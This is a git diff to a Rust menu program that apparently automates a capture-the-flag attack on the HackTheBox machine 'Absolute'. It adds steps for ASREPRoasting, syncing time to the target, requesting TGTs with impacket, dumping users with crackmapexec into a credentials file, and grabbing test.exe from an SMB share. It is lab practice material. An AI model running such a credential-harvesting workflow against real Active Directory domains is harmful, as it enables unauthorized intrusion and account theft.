@@ -3,6 +3,9 @@ use std::process::{Command, Stdio};
 
 mod step_1;
 mod step_2;
+mod step_3;
+mod step_4;
+mod step_5;
 
 fn main() {
     // Get the IP address from the user
@@ -50,9 +53,11 @@ fn main() {
     loop {
         println!("\nSelect an option:");
         println!("Step 1. Generate Username List");
-        println!("Step 2. Validate/ASREPRoast");
+        println!("Step 2. Validate + ASREPRoast");
         println!("Step 3. Sync time to Absolute.htb");
-        println!("4. Quit");
+        println!("Step 4. Generate TGTs + Dump Users");
+        println!("Step 5. Grab SMB File");
+        println!("6. Quit");
 
         print!("Enter your choice: ");
         let _ = stdout().flush();
@@ -80,10 +85,26 @@ fn main() {
                 println!("Creds.txt Updated")
             }
             "3" => {
-                println!("You selected Option 3");
-                // Perform the desired action for option 3
+                println!("Warning: This command will sync your time to absolute.htb...");
+                step_3::run_ntpdate();
+                println!("Time Changed, you should double check it really did...")
             }
             "4" => {
+                println!("Creating TGT...");
+                step_4::run_impacket_gettgt_first_user();
+                println!("Dumping Users...");
+                let crackmapexec_output = step_4::run_crackmapexec();
+                println!("Updating Creds.txt...");
+                step_4::update_creds_file(&crackmapexec_output);
+                println!("Creating New TGT for New User...");
+                step_4::run_impacket_gettgt_second_user();
+            }
+            "5" => {
+                println!("Downloading test.exe from share...");
+                step_5::download_test_exe();
+
+            }
+            "6" => {
                 println!("Quitting...");
                 break;
             }
